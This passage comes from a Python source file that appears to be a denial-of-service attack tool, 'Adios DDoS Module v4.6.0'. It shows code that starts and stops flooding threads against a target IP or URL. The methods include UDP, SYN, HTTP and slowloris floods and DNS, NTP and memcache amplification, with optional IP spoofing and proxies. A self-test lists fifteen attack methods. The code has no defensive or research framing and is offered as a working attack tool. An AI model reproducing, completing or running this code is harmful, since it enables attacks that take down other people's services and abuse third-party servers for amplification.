                t = threading.Thread(target=_worker_wrapper, args=(_udp_flood_worker, target_ip, resolved_port, packet_size))
            elif m == "syn-flood":
                t = threading.Thread(target=_worker_wrapper, args=(_syn_flood_worker, target_ip, resolved_port))
            elif m == "http-flood":
                t = threading.Thread(target=_worker_wrapper, args=(_http_flood_worker, target_url, "GET", False))
            elif m == "slowloris":
                t = threading.Thread(target=_worker_wrapper, args=(_slowloris_worker, target_ip, resolved_port))
            elif m == "icmp-flood":
                t = threading.Thread(target=_worker_wrapper, args=(_icmp_flood_worker, target_ip))
            elif m == "memcache-flood":
                t = threading.Thread(target=_worker_wrapper, args=(_memcache_flood_worker, target_ip, resolved_port))
            elif m == "dns-flood":
                if dns_server:
                    t = threading.Thread(target=_worker_wrapper, args=(_dns_flood_worker, target_ip, dns_server))
                else:
                    continue
            elif m == "ntp-flood":
                if ntp_server:
                    t = threading.Thread(target=_worker_wrapper, args=(_ntp_flood_worker, target_ip, ntp_server))
                else:
                    continue
            t.daemon = True
            try:
                t.start()
                workers.append(t)
            except RuntimeError as e:
                logger.error("Thread creation failed: %s", e)
                break
    elif method in method_map:
        worker_func, args = method_map[method]
        for _ in range(threads):
            t = threading.Thread(target=_worker_wrapper, args=(worker_func, *args))
            t.daemon = True
            try:
                t.start()
                workers.append(t)
            except RuntimeError as e:
                logger.error("Thread creation failed: %s", e)
                break
    else:
        return {"success": False, "error": f"Unknown method: {method}"}

    _attack_threads = workers
    logger.info("Attack started: method=%s target=%s threads=%d spoof=%s",
                method, target, len(workers), spoof_ip or "none")
    return {"success": True, "message": f"Attack started ({method} on {target}) with {len(workers)} threads"}

def stop_attack() -> Dict[str, Any]:
    global _attack_threads
    if not _stats["active"]:
        return {"success": False, "error": "No attack is running"}
    _stop_event.set()
    for t in _attack_threads:
        t.join(timeout=2)
    _attack_threads = []
    with _lock:
        _stats["active"] = False
    logger.info("Attack stopped")
    return {"success": True, "message": "Attack stopped"}

def get_attack_status() -> Dict[str, Any]:
    with _lock:
        return {
            "active": _stats["active"],
            "target": _stats["target"],
            "method": _stats["method"],
            "start_time": _stats["start_time"],
            "packets_sent": _stats["packets_sent"],
            "bytes_sent": _stats["bytes_sent"],
            "errors": _stats["errors"],
            "threads": len(_attack_threads),
            "spoof_ip": _stats["spoof_ip"],
            "target_port": _stats["target_port"],
            "proxy_count": get_proxy_count(),
        }

# ---------------------------------------------------------------------------
# Self-test
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print("Adios DDoS Module v4.6.0")
    print("Available methods:", ", ".join([
        "udp-flood", "tcp-flood", "syn-flood", "ack-flood", "rst-flood",
        "http-flood", "https-flood", "slowloris", "icmp-flood",
        "memcache-flood", "dns-flood", "ntp-flood", "http2-flood", "tls-flood", "mixed"
    ]))
    print("Proxy sources:", len(PROXY_SOURCES))
    print("Port file:", PORT_FILE_PATH)

    # Test port file loading
    ensure_port_directory()
    ports = load_ports_from_file()
    print(f"\nPort file loaded: {len(ports)} ports")

    # Test proxy count
    print(f"Current proxy count: {get_proxy_count()}")